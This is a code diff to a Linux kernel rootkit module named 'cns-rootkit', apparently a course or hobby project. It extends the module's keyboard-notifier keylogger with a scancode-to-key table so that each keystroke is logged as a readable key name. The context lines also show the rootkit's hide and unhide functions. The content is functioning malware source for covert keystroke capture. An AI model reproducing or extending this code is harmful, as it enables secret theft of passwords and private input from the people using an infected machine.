@@ -223,13 +223,25 @@ void cns_rootkit_unhide(void)
     is_hidden = 0;
 }
 
+char *scancode_to_key[] = {
+  "Dunno",
+  "ESC",
+  "1", "2","3","4","5","6","7","8","9","0",
+  "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]",
+  "ENTER", "LCTRL", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "LSHIFT",
+  "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "RSHIFT", "NUM*", "LALT", "SPACE", "CAPSLOCK",
+  "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","NUMLOCK", "SCROLLLOCK",
+  "NUM7", "NUM8", "NUM9", "NUM-", "NUM4", "NUM5", "NUM6", "NUM+", "NUM1", "NUM2", "NUM3", "NUM0", "NUM.",
+  "Dunno", "Dunno", "Dunno", "F11", "F12", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, "HOME", "UP", 0, "LEFT", "RIGHT", 0, "DOWN"
+};
+
 int cns_keyboard_notifier(struct notifier_block *nb, unsigned long action, void *_data) {
   printk(KERN_INFO "cns-rootkit: in keyboard notifier\n");
   struct keyboard_notifier_param *data = (struct keyboard_notifier_param*)_data;
   struct vc_data *vc = data->vc;
 
   if(action == KBD_KEYCODE) {
-    printk(KERN_INFO "cns-rootkit: Keylogger %i %s\n", data->value, (data->down ? "down" : "up"));
+    printk(KERN_INFO "cns-rootkit: Keylogger %i %s %s\n", data->value, scancode_to_key[data->value], (data->down ? "down" : "up"));
   }
 
   return NOTIFY_OK;
